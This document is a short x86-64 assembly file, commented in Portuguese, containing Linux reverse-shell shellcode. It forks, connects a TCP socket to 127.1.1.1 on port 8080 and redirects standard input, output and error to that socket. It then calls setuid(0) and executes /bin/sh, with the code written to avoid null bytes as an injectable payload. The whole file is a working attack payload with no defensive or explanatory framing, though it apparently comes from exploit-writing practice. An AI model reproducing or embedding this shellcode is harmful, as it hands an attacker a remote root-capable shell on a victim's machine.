[SECTION .text]

	global _start

_start:

	; fork()

	push 57
	pop rax
	syscall

	test rax, rax ; compara o rax

	jmp short socket
	nop

	socket:

	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	push 6
	pop rdx
	syscall

	; auto save socket fd

	push rax
	pop rbp

	xor rax, rax
	push rax                         ; (bzero)
	mov dword [rsp-4], 0x0101017f 	 ; 127.1.1.1 (ip)
	mov word [rsp-6], 0x901f         ; 0x1f90 = 8080 (porta)
	mov word [rsp-8], ax             ; elimina null byte
	add byte [rsp-8], 0x2            ; 0x0002 (protocolo af_inet)
	sub rsp, 8                       ; rsp no começo da função

	xor rax, rax
	mov rdx, rax
	mov rsi, rsp                     ; sockaddr *addr
	push rbp ; fd do socket
	pop rdi
	push 42
	pop rax
	push 16
	pop rdx
	syscall

	;dup2(3, 0)

	push rbp
	pop rdi
    xor rsi, rsi
	push 33
	pop rax
	syscall

	; dup2(3, 1)

	push rbp
	pop rdi
	push 1
	pop rsi
	push 33
	pop rax
	syscall

	; dup2(3, 2)

	 push rbp
	 pop rdi
	 push 2
	 pop rsi
	 push 33
	 pop rax
	 syscall

	 jmp short shell
	 nop

	 shell:

	 push 105
	 pop rax
	 xor rdi, rdi
	 syscall

	 mov rdi, 0x68732f6e69622f6a
	 shr rdi, 8
	 push rdi
	 push rsp
	 pop rdi
 	 push 59
 	 pop rax
 	 xor rsi, rsi
 	 xor rdx, rdx
 	 syscall
